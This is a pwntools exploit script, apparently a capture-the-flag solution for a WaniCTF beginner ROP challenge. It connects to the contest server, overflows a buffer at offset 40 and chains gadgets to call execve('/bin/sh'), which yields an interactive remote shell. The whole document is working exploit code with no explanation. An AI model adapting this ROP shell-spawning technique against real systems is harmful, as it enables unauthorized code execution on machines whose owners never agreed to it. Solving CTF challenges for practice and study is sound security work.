from pwn import *

context.binary = "./chall"
# io = gdb.debug("./chall")
io = remote("beginners-rop-pwn.wanictf.org", 9005)
elf = context.binary
OFFSET = 40
io.clean()
rop = ROP(elf)
rop.call(elf.sym.pop_rax_ret+8)
rop.raw(0x3b)
rop.call(elf.sym.mov_rsp_rdi_pop_ret+5)
rop.raw(b"/bin/sh\0")
rop.call(elf.sym.xor_rsi_ret+8)
rop.call(elf.sym.xor_rdx_ret+8)
rop.call(elf.sym.syscall_ret+8)

io.fit({
    40: rop.chain()
    })

io.interactive()
